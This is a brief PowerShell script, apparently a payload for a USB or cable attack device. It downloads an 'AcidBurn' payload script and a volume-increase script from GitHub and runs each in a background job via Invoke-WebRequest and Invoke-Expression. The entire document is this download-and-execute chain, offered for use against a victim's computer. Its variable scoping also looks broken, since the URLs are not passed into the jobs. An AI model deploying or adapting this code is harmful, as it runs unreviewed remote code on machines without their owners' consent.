# Define the URL for AcidBurn.ps1 and volume_increase.ps1
$urlAcidBurn = "https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-AcidBurn/AcidBurn.ps1?dl=1"
$urlVolumeIncrease = "https://raw.githubusercontent.com/Muhammad-Hayyan/vol_increase/main/vol.ps1?dl=1"

# Start the AcidBurn script in a background job
Start-Job -ScriptBlock {
    $scriptAcidBurn = Invoke-WebRequest -Uri $urlAcidBurn -Method Get
    Invoke-Expression $scriptAcidBurn.Content
}

# Start the volume increase script in a background job
Start-Job -ScriptBlock {
    $scriptVolumeIncrease = Invoke-WebRequest -Uri $urlVolumeIncrease -Method Get
    Invoke-Expression $scriptVolumeIncrease.Content
}


